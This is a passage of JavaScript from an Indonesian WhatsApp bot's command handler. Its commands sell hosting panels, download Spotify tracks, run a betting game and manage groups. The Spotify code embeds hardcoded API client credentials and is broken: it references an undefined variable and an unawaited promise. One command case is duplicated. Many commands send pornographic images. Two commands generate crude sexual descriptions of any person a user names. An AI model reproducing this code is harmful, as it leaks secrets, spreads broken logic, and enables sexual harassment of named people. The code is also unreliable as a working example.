		},
		{
			buttonId: "btns",
			buttonText: {
				displayText: "..."
			},
			nativeFlowInfo: {
name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Pilihan Panel", 
 sections: [{
 highlight_label: "Harga Rp 5,000",
 rows: [{
 header: 'panel server private',
 title: "6gb",
 description: `paket 1`,
 id: `.belinokos`
 }]}, {
 highlight_label: "Harga Rp 7,000 ",
 rows: [{
 header: 'panel server private',
 title: "7gb",
 description: `paket 2`,
 id: `.belinokos`
 }]}, {
 highlight_label: "Harga Rp 8,000 ",
 rows: [{
 header: 'panel server private',
 title: "8gb",
 description: `paket 3`,
 id: `.belinokos`
 }]},{
 highlight_label: "Harga Rp 9,000 ",
 rows: [{
 header: 'panel server private',
 title: "9gb",
 description: `paket 4`,
 id: `.belinokos`
 }]},{
 highlight_label: "Harga Rp 10,000 ",
 rows: [{
 header: 'panel server private',
 title: "10gb",
 description: `paket 5`,
 id: `.belinokos`
 }]},{
 highlight_label: "Harga Rp 12,000 ",
 rows: [{
 header: 'panel server private',
 title: "unlimited",
 description: `paket 6`,
 id: `.belinokos`
 },{
 header: 'Owner',
 title: "Nomor Owner Botz Ganteng 😈",
 description: ``,
 id: `.owner`
 }]
 }]
 })
			},
		}
	],
	headerType: 1,
	viewOnce: true
});
}
break




case 'bayar_vps_paket_1':
case 'bayar_vps_paket_2':
case 'bayar_vps_paket_3':
case 'bayar_vps_paket_4':
case 'bayar_vps_paket_5':
case 'bayar_vps_paket_6':
case 'bayar1gb':
case 'bayar2gb':
case 'bayar3gb':
case 'bayar4gb':
case 'bayar5gb':
case 'bayar6gb':
case 'bayar7gb':
case 'bayar8gb':
case 'bayar9gb':
case 'bayarunli':
case 'bayar_vps':
case 'bayar_panel':
case 'bayar_nokos':
reply('Kami sedang menyampaikan ke *`owner`* untuk pesanan anda 👍\nsilahkan tunggu yaaa.')
Ditss.sendMessage(`${global.owner}@s.whatsapp.net`, { image: { url : 'https://telegra.ph/file/0437dfca1c8c72d4baa5d.jpg' }, caption: `Hay *${monospa('OWNER')}* 👋\n Ada pelanggan mau *${command}* nih!!\n\nDari: *${pushname}*\nNomor: _${m.sender.split('@')[0]}_` }, { quoted: m })
break



case "totag":{
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin && !isPremium) return Reply(mess.admin)
 let users = participants.map(u => u.id).filter(v => v !== Ditss.user.jid)
 if (!m.quoted) return reply(`✳️ Reply to a message`)
 Ditss.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: users } )
}
break



case "adduserdb":{
if (!isCreator) return
if (!froms) return m.reply('Mention or Reply chat target.')
if (global.db.users[froms] !== undefined) return m.reply('User telah terdaftar di database!')
global.db.users[froms] = {
register: true,
name: '-',
serial: crypto.randomBytes(10).toString('hex'),
date: tanggal,
limit: 10,
owner: false,
premium: false,
banned: false
}
var jeje = `@${froms.split('@')[0]} Telah Terdaftar Ke Database Bot\nSekarang anda Bisa melihatnya di *.listdbuser*`
await reply(jeje)
} 
break



case "adduserdb":{
if (!isCreator) return
if (!froms) return m.reply('Mention or Reply chat target.')
if (global.db.users[froms] !== undefined) return m.reply('User telah terdaftar di database!')
global.db.users[froms] = {
register: true,
name: '-',
serial: crypto.randomBytes(10).toString('hex'),
date: tanggal,
limit: 10,
owner: false,
premium: false,
banned: false
}
var jeje = `@${froms.split('@')[0]} Telah Terdaftar Ke Database Bot\nSekarang anda Bisa melihatnya di *.listdbuser*`
await reply(jeje)
} 
break



case 'spotify': {
const axios = require("axios")
if (!text) return m.reply("apa yang mau dicari")

async function convert(ms) {
	var minutes = Math.floor(ms / 60000)
	var seconds = ((ms % 60000) / 1000).toFixed(0)
	return minutes + ':' + (seconds < 10 ? '0' : '') + seconds
}

async function down (url) {
	const BASEURL = "https://api.fabdl.com";
	const headers = {
		Accept: "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
	};

	try {
		const {
			data: info
		} = await axios.get(`${BASEURL}/spotify/get?url=${url}`, {
			headers
		});
		const {
			gid,
			id,
			name,
			image,
			duration_ms
		} = info.result;

		const {
			data: download
		} = await axios.get(`${BASEURL}/spotify/mp3-convert-task/${gid}/${id}`, {
			headers
		});
		if (download.result.download_url) {
			return `${BASEURL}${download.result.download_url}`
		}
	} catch (error) {
		console.error("Error downloading Spotify track:", error.message);
		throw new Error(error.message);
	}
};

async function spotifyCreds() {
	return new Promise(async resolve => {
		try {
			const json = await (await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
				headers: {
					Authorization: 'Basic ' + Buffer.from('4c4fc8c3496243cbba99b39826e2841f' + ':' + 'd598f89aba0946e2b85fb8aefa9ae4c8').toString('base64')
				}
			})).data
			if (!json.access_token) return resolve({
				status: false,
				msg: 'Can\'t generate token!'
			})
			resolve({
				status: true,
				data: json
			})
		} catch (e) {
			resolve({
				status: false,
				msg: e.message
			})
		}
	})
}

async function play(query) {
	return new Promise(async resolve => {
		try {

			const creds = await spotifyCreds()
			if (!creds.status) return resolve(creds)
			const json = await (await axios.get('https://api.spotify.com/v1/search?query=' + query + '&type=track&offset=0&limit=1', {
				headers: {
					Authorization: 'Bearer ' + creds.data.access_token
				}
			})).data
			if (!json.tracks.items || json.tracks.items.length < 1) return resolve({
				status: false,
				msg: 'Music not found!'
			})
			let metadata = {}
			let v = json.tracks.items[0]
			let url = await down(v.external_urls.spotify)
			metadata = {
				title: v.album.artists[0].name + ' - ' + v.name,
				artist: v.album.artists[0].name,
				name: v.name,
				duration: convert(v.duration_ms),
				popularity: v.popularity + '%',
				preview: v.preview_url || 'No preview audio Avaible',
				thumbnail: v.album.images[0].url,
				url: v.external_urls.spotify,
			}
			resolve({
				status: true,
				metadata,
				audio: { url }
			})
		} catch (e) {
			resolve({
				status: false,
				msg: e.message
			})
		}
	})
}

const kont = play(text)
/*Ditss.sendMessage(m.chat, {image: {url: kont.metadata.thumbnail}, caption: `
Title: ${kont.metadata.title}
Artist: ${kont.metadata.artist}
Name: ${kont.metadata.name}
Preview Url: ${kont.metadata.preview}
Popularity: ${kont.metadata.popularity}
Url: ${kont.metadata.url}
`}, {quoted: null})*/

await Ditss.sendMessage(m.chat, {
 audio: { url: url },
 mimetype: 'audio/mpeg',
 fileName: `${kont.metadata.title}.mp3`
 }, { quoted: m });
}
break



case 'antibot':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.antibot) return reply('UDAH ON!')
global.antibot = true
reply('Fitur antibot telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antibot) return reply('UDAH OFF!')
global.antibot = false
reply('Fitur antibot telah di matikan')
} else reply('on / off')
break //Powered By D1tss



case "oweuh":{
 const {
 generateWAMessageFromContent,
 generateWAMessageContent,
 proto,
 prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

async function image(url) {
const { imageMessage } = await generateWAMessageContent({
 image: {
 url
 },
 }, {
 upload: Ditss.waUploadToServer
 })
 return imageMessage
}

let msg = await generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: {
 text: "I'm ditss", 
 },
 header: {
 title: 'oii',
 hasMediaAttachment: true, 
 productMessage: {
 product: {
 productImage: await image(reply),
 productId: "8363525327041213",
 title: "Mau Apa?",
 description: "Nyari Apa Dek?",
 currencyCode: "IDR",
		 priceAmount1000: "24580000000",
		 retailerId: "ntahl-",
		 url: global.linkGrup,
	 productImageCount: 1,
 },
 businessOwnerJid: "6285882135288@s.whatsapp.net",
 } 
 },
 nativeFlowMessage: {
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": "{\"display_text\":\"REPLY\",\"id\":\".play\"}"
 },
 ],
 },
 },
 },
 },
 },
 { quoted : m }
);
 

await Ditss.relayMessage(
 msg.key.remoteJid,
 msg.message,
 { messageId: msg.key.id }
);
}
break



case"ditss": case "kontolodon":{
const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys")
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: "Ditss si pler kudaa🗿🥵"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "Bot wangsapp😈"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: "kamu mana bisa buat begini🗿",
 subtitle: "test",
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "single_select",
 "buttonParamsJson": "{\"title\":\"title\",\"sections\":[{\".menu\":\".play dj webito\",\"highlight_label\":\"label\",\"rows\":[{\"header\":\"header\",\"title\":\"title\",\"description\":\"description\",\"id\":\"id\"},{\"header\":\"header\",\"title\":\"title\",\"description\":\"description\",\"id\":\"id\"}]}]}"
 },
 {
 "name": ".menu",
 "buttonParamsJson": "{\"display_text\":\"quick_reply\",\"id\":\"message\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"url\",\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
 },
 {
 "name": "cta_call",
 "buttonParamsJson": "{\"display_text\":\"call\",\"id\":\"message\"}"
 },
 {
 "name": "cta_copy",
 "buttonParamsJson": "{\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"message\"}"
 },
 {
 "name": "cta_reminder",
 "buttonParamsJson": "{\"display_text\":\"Recordatorio\",\"id\":\"message\"}"
 },
 {
 "name": "cta_cancel_reminder",
 "buttonParamsJson": "{\"display_text\":\"cta_cancel_reminder\",\"id\":\"message\"}"
 },
 {
 "name": "address_message",
 "buttonParamsJson": "{\"display_text\":\"address_message\",\"id\":\"message\"}"
 },
 {
 "name": "send_location",
 "buttonParamsJson": ""
 }
 ],
 })
 })
 }
 }
}, {})
return Ditss.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
}
break





case 'cuckold':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/cuckold.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'cum':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/cum.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'eba':
case 'manga':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/eba.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'ero':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/ero.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'yuri':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/yuri.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'pussy':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/pussy.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'dlychan':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/dlychan.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'hana':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/hana.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
 case 'merial':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/merial.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'Mihye':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/Mihye.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'nanaqi':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/nanaqi.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'NguyenXHuang':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/NguyenXHuang.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'Noname':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/Noname.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'nude':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/nude.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'okita':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/okita.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'onlyfans':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/onlyfans.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'quan':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/quan.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'umekoj':
//if (!isRegistered) return registerbut(noregis)
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/umekoj.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break
case 'yoshinobi':
await Ditss.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/yoshinobi.json'))
var dltssResult = pickRandom(ahegaonsfw)
Ditss.sendMessage(m.chat, { caption: "Done 🍏", image: { url: dltssResult.url } }, { quoted: m })
break



case 'jadihd':{
if (!m.quoted) return reply("Reply photo nya bloon")
const { remini } = require('../library/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
Ditss.sendMessage(m.chat, { image: proses, caption:"Nihh Gambarnya jadi HD"}, { quoted: m})
}
break



case 'admin':{
if (!m.isGroup) return m.reply(mess.group)
if (!isPremium) return m.reply(mess.premium)
const groupAdmins = participants.filter(p => p.admin)
const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
let text = `${listAdmin}`
Ditss.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner]}, {quoted: m})
}
break



case 'setppbot':{
if (!isCreator) return reply(mess.owner)
if (!/image/.test(mime)) return reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return pesan(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var medis = await Ditss.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (text == 'full') {
var {
img
} = await generateProfilePicture(medis)
await Ditss.query({
tag: 'iq',
attrs: {
to: botNumber,
type: 'set',
xmlns: 'w:profile:picture'
},
content: [{
tag: 'picture',
attrs: {
type: 'image'
},
content: img
}]
})
fs.unlinkSync(medis)
pesan(mess.done)
} else {
var memeg = await Ditss.updateProfilePicture(botNumber, {
url: medis
})
fs.unlinkSync(medis)
reply(mess.done)
}
}
break

case 'setppbot2':{
if (!isCreator) return reply(mess.owner)
if (!/image/.test(mime)) return reply(`Reply Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return pesan(`Reply Gambar Dengan Caption ${prefix + command}`)
let media = await Ditss.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await Ditss.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: {type: 'image'},
content: img
} 
]
})
reply(mess.done)
}
break



case 'delppgc':{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isCreator) return Reply(mess.admin)
if (!isBotAdmins) return Reply("bot harus atmin bego amat")
await Ditss.removeProfilePicture(from)
}
break



case 'setppgc':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply("bego bot hapus atmin")
if (!/image/.test(mime)) return reply(`Send/Reply Image Caption Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var medis = await Ditss.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (text == 'full') {
var {
img
} = await generateProfilePicture(medis)
await Ditss.query({
tag: 'iq',
attrs: {
to: m.chat,
type: 'set',
xmlns: 'w:profile:picture'
},
content: [{
tag: 'picture',
attrs: {
type: 'image'
},
content: img
}]
})
fs.unlinkSync(medis)
Reply(mess.done)
} else {
var memeg = await Ditss.updateProfilePicture(m.chat, {
url: medis
})
fs.unlinkSync(medis)
reply(mess.done)
}
break

case 'setppgc2':{
if (!m.isGroup) return Reply(mess.group)
if (!isAdmins) return Reply(mess.admin)
if (!isBotAdmins) return Reply(mess.botAdmin)
if (!/image/.test(mime)) return Reply(`Reply Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return Reply(`Reply Gambar Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await conn.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
Reply(mess.done)
}
break



case 'setnamegc':
if (!m.isGroup) return Reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return Reply(mess.admin)
if (!isBotAdmins) return Reply(mess.botAdmin)
if (!text) return Reply('text nya mana??')
await conn.groupUpdateSubject(m.chat, text)
Reply(mess.done)
break



case 'setdesc':
case 'setdesk':
if (!m.isGroup) return Reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return Reply(mess.admin)
if (!isBotAdmins) return Reply(mess.botAdmin)
if (!text) return Reply(`contoh\n${prefix + command} Description`)
await Ditss.groupUpdateDescription(m.chat, text)
Reply(mess.done)
break



case 'getdesk': case 'getdeskripsigc': case 'getdesc': {
if (!m.isGroup) return Reply(mess.group)
let iya = `${groupMetadata.desc}`
Reply(iya)
}
break



case 'animekiss': {
 await reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)
 await Ditss.sendMessage(m.chat, { image: { url: waifudd.data.url }, caption: mess.success }, { quoted: m }).catch(err => {
 return ('Error!')
 })
 }
 break



case "jadinyata": case "toreal": case 'toanime': case 'jadianime': {
 if (!isPremium) return
 reply(mess.prem)
 if (!quoted) return reply(`Fotonya Mana?`)
 if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
 let { key } = await Ditss.sendMessage(m.chat, { text: mess.wait }, { quoted: m })
 let type = "anime2d"
 if (["jadinyata", "toreal"].includes(command)) {
 type = "anime2real"
 }
 let tryng = 0
 const media = await Ditss.downloadAndSaveMediaMessage(quoted)
 let tph = await TelegraPh(media)
 try {
 let ai = await fetch(api.xterm.url + "/api/img2img/filters?action=" + type + "&url=" + tph + "&key=" + api.xterm.key).then(a => a.json())
 console.log(ai)
 if (!ai.status) return reply(ai?.msg || "Error!")
 while (tryng < 55) {
 let s = await fetch(api.xterm.url + "/api/img2img/filters/batchProgress?id=" + ai.id).then(a => a.json())
 await Ditss.sendMessage(m.chat, { text: s?.progress || "Prepare... ", edit: key }, { quoted: m })
 if (s.status == 3) {
 return Ditss.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m })
 }
 if (s.status == 4) {
 return reply("Maaf terjadi kesalhan. coba gunakan gambar lain!")
 }
 await new Promise(resolve => setTimeout(resolve, 5000))
 }
 } catch (e) {
 console.error(e)
 reply(`Type-Err! :\n${e}`)
 }
 }
 break



case 'cekmemek': {
 if (!text) return reply('Nama nya mana yang mau di cek memek nya')
 function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)]
 }


 reply(`
╭━━━━°「 *Memek ${text}* 」°
┃
┊• Nama : ${text}
┃• Memek : ${pickRandom(['ih item', 'Belang wkwk', 'Muluss', 'Putih Mulus', 'Pink Banget', 'Black Doff', 'Pink wow', 'Item Glossy'])}
┊• Tipe : ${pickRandom(['Perawan', 'ga perawan', 'udah pernah dimasukin', 'Tembem', 'masih ori', 'jumbo'])}
┃• jembut : ${pickRandom(['lebat', 'ada sedikit', 'gada jembut', 'tipis', 'muluss'])}
┃• Tipe ukuran : ${pickRandom(['Sempit', 'Lumayan Sempit', 'Longgar', 'Lumayan longgar', 'Bolong', 'Bolong gede anjir', 'Pucuknya Kendor', 'Kendor', 'Lumayan kendor', 'Sempurna Bejir', 'Lumayan Sempurna', 'Sempurna Bau Keperawanannya', 'gak normal'])}
╰═┅═━––––––๑`)
 }
 break



case 'cekkontol': {
 if (!text) return Reply('Nama nya mana yang mau di cek kontol nya')
 function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)]
 }


 Reply(`
╭━━━━°「 *Kontol ${text}* 」°
┃
┊• Nama : ${text}
┃• Kontol : ${pickRandom(['ih item', 'Belang wkwk', 'Muluss', 'Putih Mulus', 'Black Doff', 'Pink wow', 'Item Glossy'])}
┊• Tipe : ${pickRandom(['perjaka', 'ga perjaka', 'udah pernah dimasukin', 'masih ori', 'jumbo'])}
┃• jembut : ${pickRandom(['lebat', 'ada sedikit', 'gada jembut', 'tipis', 'muluss'])}
┃• ukuran : ${pickRandom(['1cm', '2cm', '3cm', '4cm', '5cm', '20cm', '45cm', '50cm', '90meter', '150meter', '5km', 'gak normal'])}
╰═┅═━––––––๑`)
 }
 break



case "h": case "z": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Ditss.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break



case 'suit':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) return reply(`Selesaikan suit mu yang sebelumnya`)
mark = `0@s.whatsapp.net`
if (!froms) return reply(`Siapa yang ingin kamu tantang?\nTag orangnya!\n\nContoh: *${command}* @${mark.split('@')[0]}`)
if (froms === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply(`Sad amat main ama diri sendiri`)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(froms))) return reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :)`)
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
var hadiah = randomNomor(10, 20)
let poin = 1000
let poin_lose = 1000
let timeout = 60000
let id = 'suit_' + new Date() * 1
suit[id] = {
chat: await Reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit dengan taruhan Saldo Rp. 2,000\n\n*Kirim (gas/gamau)* untuk bermain\n\n*Hadiah Pemenang :* Rp. 2,000\n*Hukuman Kalah :* - Rp. 2,000`),
id: id,
p: sender,
p2: froms,
status: 'wait',
hadiah: hadiah,
waktu: setTimeout(() => {
if (suit[id]) Ditss.sendMessage(from, {text: `_Waktu suit habis!_` })
delete suit[id]
}, 60000), poin, poin_lose, timeout
}
break



case "qckon": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ffffff"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]

const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": reswarna,
 "width": 512,
 "height": 768,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": m.pushName,
 "photo": {
 "url": ppuser
 }
 },
 "text": text,
 "replyMessage": {}
 }
 ]
};
 const response = axios.post('https://bot.lyo.su/quote/generate', json, {
 headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
 const buffer = Buffer.from(res.data.result.image, 'base64')
 let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
//await Ditss.sendStimg(m.chat, tempnya, m, {packname: author})
await Ditss.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break

        //===
        case 'ceksaldo':
if (!froms) return Reply(`Mau cek saldo siapa? coba reply atau tag 🤔`)
if (froms == global.owner || froms == botNumber) return Reply(`Ups, Saldo ${froms == global.owner ? 'creator saya' : 'bot'} Privasi!`)
if (db.users[froms] == undefined) return Reply('User tidak terdaftar didalam database!')
if (froms == sender) return Reply('Ketik aja saldo lah')
Reply(`*INFO SALDO DARI*\n\nTarget Cek : ${Ditss.getName(froms)}\nSaldo : Rp. ${toRupiah(cekSaldo(froms, db_saldo))}\nNomor : ${froms.split('@')[0]}`)
break
case 'saldo':{
